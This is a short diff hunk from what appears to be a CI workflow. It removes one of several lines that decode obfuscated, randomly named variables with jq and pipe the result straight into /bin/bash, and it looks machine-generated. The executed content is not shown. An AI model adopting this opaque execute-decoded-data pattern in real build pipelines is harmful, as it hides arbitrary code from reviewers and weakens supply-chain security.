@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$jbroa865" | jq -r .yxk2 | /bin/bash
           echo $dc00501 | jq -r .ixdq736 | /bin/bash
           printf '%s' "$hqpzz2" | jq -r .tzt6841 | /bin/bash
-          printf '%s' "$dzek411" | jq -r .qtg45 | /bin/bash
           printf '%s' "$lnxcx5" | jq -r .cpoo6572 | /bin/bash
           echo $a646 | jq -r .n8716 | /bin/bash
           printf '%s' "$gqml6157" | jq -r .bduxn2964 | /bin/bash
